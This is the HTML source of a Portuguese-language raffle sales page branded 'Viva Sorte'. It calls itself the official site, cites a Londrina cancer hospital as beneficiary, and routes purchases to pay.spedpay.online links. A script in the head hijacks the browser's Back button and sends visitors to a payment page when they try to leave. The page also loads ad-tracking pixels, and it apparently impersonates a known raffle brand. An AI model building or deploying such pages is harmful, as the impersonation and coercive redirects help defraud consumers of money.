<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Viva Sorte</title>

  <!-- CSS PRINCIPAL -->
  <link href="css/style.css" rel="stylesheet">
  <link href="css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
  <link rel="stylesheet" href="css/bootstrap-icons.min.css">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

  <!-- SCRIPT UTMIFY - CAPTURA E REPASSE DE UTMs -->
  <script
    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
    data-utmify-prevent-xcod-sck
    data-utmify-prevent-subids
    async
    defer
  ></script>

  <!-- SCRIPT PARA BLOQUEIO DE VOLTA (BACK REDIRECT) -->
  <script>
    const link = 'https://pay.spedpay.online/OrKuLRLO';

    // Função para capturar e manter UTMs
    function getUTMs() {
      const params = new URLSearchParams(window.location.search);
      return params.toString() ? '?' + params.toString() : '';
    }

    // Redirecionamento ao tentar sair da página
    function setBackRedirect(url) {
      let urlBackRedirect = url + getUTMs();
      history.pushState({}, '', location.href);
      history.pushState({}, '', location.href);
      history.pushState({}, '', location.href);
      window.addEventListener('popstate', () => {
        setTimeout(() => {
          location.href = urlBackRedirect;
        }, 1);
      });
    }
    setBackRedirect(link);
  </script>
</head>

<body>
  <!-- HEADER -->
  <header class="white-header">
    <div class="logo">
      <img src="images/logoviva.png" alt="Logomarca" class="logoviva">
    </div>
    <button class="menu-button" id="menuButton">HOJE</button>
  </header>

  <!-- BANNER -->
  <div class="banner">
    <div class="container-banner">
      <div id="carouselExampleSlidesOnly" class="carousel slide" data-bs-ride="carousel">
        <div class="carousel-inner">
          <div class="carousel-item active">
            <div class="tag-compre-agora"><span>Site Oficial</span></div>
            <img src="images/1m1.jpg" class="d-block w-100" alt="...">
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- TÍTULO PRINCIPAL -->
  <div class="sorteio-date w-100 text-center">
    <h1>Sorteio <span style="background-color: #f0ad4e;" id="contador">HOJE</span> por apenas <span style="background-color: #2f4eb5;">R$0,99</span></h1>
  </div>

  <!-- OPÇÕES DE COMPRA -->
  <div class="container-principal">
    <div class="cotas">
      <div class="cotas-one">
        <button type="button" class="cota" onclick="selecionarValor(20)">
          <div class="cota-qtd">+20</div>
          <h1>R$19,85</h1>
          <h2>SELECIONAR</h2>
        </button>
        <button type="button" class="cota" onclick="selecionarValor(30)">
          <div class="cota-qtd">+30</div>
          <h1>R$29,70</h1>
          <h2>SELECIONAR</h2>
        </button>
        <button type="button" class="cota" onclick="selecionarValor(40)">
          <div class="cota-qtd">+40</div>
          <h1>R$39,60</h1>
          <h2>SELECIONAR</h2>
        </button>
      </div>

      <div class="cotas-one">
        <button type="button" class="cota" onclick="selecionarValor(70)">
          <i class="bi bi-star-fill destaque"></i>
          <div class="cota-qtd">+70</div>
          <h1>R$69,30</h1>
          <h2>SELECIONAR</h2>
        </button>
        <button type="button" class="cota" onclick="selecionarValor(100)">
          <div class="cota-qtd">+100</div>
          <h1>R$99,00</h1>
          <h2>SELECIONAR</h2>
        </button>
        <button type="button" class="cota" onclick="selecionarValor(200)">
          <div class="cota-qtd">+200</div>
          <h1>R$199,00</h1>
          <h2>SELECIONAR</h2>
        </button>
      </div>
    </div>
  </div>

  <!-- CONTADOR E BOTÃO DE COMPRA -->
  <div class="container-principal">
    <div class="contador-cotas">
      <span><button type="button" class="btn-contador-cotas" onclick="decrementar()">-</button></span>
      <input type="number" id="numero" class="input-contador-cotas" value="0" min="0" oninput="highlightButton()">
      <span><button type="button" class="btn-contador-cotas" onclick="incrementar()">+</button></span>
    </div>

    <button type="button" id="btn-adicionar-carrinho" class="adc-carrinho" onclick="adicionarAoCarrinho()" disabled>
      <i class="bi bi-cart-fill"></i> COMPRAR TÍTULOS
    </button>

    <div class="sorteio-date w-100 text-center" style="margin-top: 5px;">
      <br>
      <h1 style="font-size: 0.72rem;">Comprar mais títulos aumenta suas chances de ganhar!</h1>
    </div>
  </div>

  <!-- INSTITUIÇÃO BENEFICIADA -->
  <div class="container-principal">
    <div class="hospital">
      <div class="card-hospital">
        <div class="card-hospital-image">
          <img src="images/logo-hospital.svg">
          <h2>Instituição beneficiada</h2>
        </div>
        <div class="card-hospital-text">
          <p>O Hospital do Câncer de Londrina, fundado em 08 de novembro de 1965 por Lucilla Pinto Ballalai, foi originalmente chamado Centro Norte Paranaense de Pesquisas Médicas. Criado com o objetivo de melhorar o tratamento do câncer e a qualidade de vida, o hospital focava inicialmente na prevenção do câncer de colo de útero entre as mulheres de Londrina e região. A instituição sempre buscou aprimorar seus recursos humanos, científicos e tecnológicos.</p>
        </div>
      </div>

      <div class="card-hospital card-hospital-bg-azul">
        <div class="card-hospital-image">
          <img src="images/viva-hosp.svg">
          <h2>Viva Privilégios</h2>
        </div>
        <div class="card-hospital-text">
          <p>Viva Privilégios, um programa que enriquece sua vida com acesso saúde...</p>
        </div>
      </div>
    </div>
  </div>

  <!-- RODAPÉ -->
  <link href="css/rodape.css" rel="stylesheet">
  <div class="rodape">
    <div class="container-principal">
      <img class="logo-rodape" src="images/logoviva.png">
      <div class="redes">
        <i class="bi bi-instagram"></i>
        <i class="bi bi-facebook"></i>
        <i class="bi bi-twitter"></i>
        <i class="bi bi-youtube"></i>
      </div>
      <h1>...</h1>
    </div>
  </div>

  <!-- SCRIPT DE LÓGICA -->
  <script>
    const precoPorUnidade = 0.99;

    function getUTMs() {
      const params = new URLSearchParams(window.location.search);
      return params.toString() ? '?' + params.toString() : '';
    }

    function incrementar() {
      const input = document.getElementById('numero');
      let valorAtual = parseInt(input.value);
      if (valorAtual < 200) {
        if (valorAtual === 0) input.value = 20;
        else if (valorAtual === 20) input.value = 30;
        else if (valorAtual === 30) input.value = 40;
        else if (valorAtual === 40) input.value = 70;
        else if (valorAtual === 70) input.value = 100;
        else if (valorAtual === 100) input.value = 200;
      }
      highlightButton();
    }

    function decrementar() {
      const input = document.getElementById('numero');
      let valorAtual = parseInt(input.value);
      if (valorAtual > 20) {
        if (valorAtual === 200) input.value = 100;
        else if (valorAtual === 100) input.value = 70;
        else if (valorAtual === 70) input.value = 40;
        else if (valorAtual === 40) input.value = 30;
        else if (valorAtual === 30) input.value = 20;
      }
      highlightButton();
    }

    function highlightButton() {
      const input = document.getElementById('numero');
      const valorAtual = parseInt(input.value);
      const botoesCotas = document.querySelectorAll('.cota');
      const botaoAdicionarCarrinho = document.getElementById('btn-adicionar-carrinho');
      let link;

      botoesCotas.forEach(botao => {
        botao.classList.remove('cota-selected');
        const valorBotao = parseInt(botao.querySelector('.cota-qtd').innerText.trim());
        if (valorBotao === valorAtual) {
          botao.classList.add('cota-selected');
          switch (valorBotao) {
            case 20: link = "https://pay.spedpay.online/nocWXRdd"; break;
            case 30: link = "https://pay.spedpay.online/nyYEZNjk"; break;
            case 40: link = "https://pay.spedpay.online/XcZrKopG"; break;
            case 70: link = "https://pay.spedpay.online/ArLfskBe"; break;
            case 100: link = "https://pay.spedpay.online/ipANLDJe"; break;
            case 200: link = "https://pay.spedpay.online/LQAHmGsM"; break;
          }
          botaoAdicionarCarrinho.setAttribute('onclick', 'adicionarAoCarrinho("' + link + '")');
        }
      });
      botaoAdicionarCarrinho.disabled = valorAtual === 0;
    }

    function selecionarValor(valor) {
      document.getElementById('numero').value = valor;
      highlightButton();
    }

    function adicionarAoCarrinho(link) {
      window.location.href = link + getUTMs();
    }
  </script>

  <!-- BOOTSTRAP -->
  <script src="js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>

  <!-- PIXEL UTMIFY -->
  <script>
    window.pixelId = "69012e55c442991f00824a8e";
    var a = document.createElement("script");
    a.setAttribute("async", "");
    a.setAttribute("defer", "");
    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
    document.head.appendChild(a);
  </script>

  <!-- POPUP DE COMPRAS -->
  <style>
    body { font-family: Arial, sans-serif; background: #f0f0f0; }
    .popup {
      position: fixed;
      bottom: 30px;
      left: 30px;
      background-color: #d4edda;
      border-left: 6px solid #28a745;
      color: #155724;
      padding: 15px 20px;
      border-radius: 8px;
      box-shadow: 0 0 15px rgba(0,0,0,0.2);
      display: none;
      animation: fadeIn 0.5s ease-in-out;
      z-index: 9999;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</body>
</html>
